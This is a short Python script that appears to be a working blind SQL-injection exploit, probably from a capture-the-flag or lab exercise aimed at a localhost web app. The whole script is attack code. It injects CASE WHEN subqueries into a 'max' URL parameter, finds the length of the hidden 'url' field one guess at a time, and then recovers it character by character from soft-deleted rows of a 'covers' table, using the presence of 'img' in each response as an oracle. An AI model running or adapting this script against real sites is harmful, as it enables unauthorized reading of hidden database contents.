import requests


base_url = "http://localhost:8080?max="
all_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ:=/? ."

def get_payload(target, n, c):
    return "(select CASE WHEN (select substring("+target+", "+n+", 1) from covers where deleted_at is not null) == '"+c+"' THEN 1 ELSE 0 END)"

def get_length_payload(target, n):
    return "(select CASE WHEN (select length("+target+") from covers where deleted_at is not null) == "+n+" THEN 1 ELSE 0 END)"

def get_length(target):
    i = 1
    while True:
        url = base_url+get_length_payload(target, str(i))
        print(url)
        r = requests.get(url)
        if "img" in r.text:
            return i
        print("Testing length: "+str(i))
        i += 1

def get_text(target, l):
    text = ""

    for i in range(l):
        for c in all_chars:
            url = base_url + get_payload(target, str(i+1), c)
            print(url)
            r = requests.get(url)
            if "img" in r.text:
                text += c
                print("Found char: "+c)
                break

    return text


def check():
    
    r = requests.get(base_url+"7")
    print("img" in r.text)


target = "url"

l = get_length(target)
txt = get_text(target, l)
print(txt)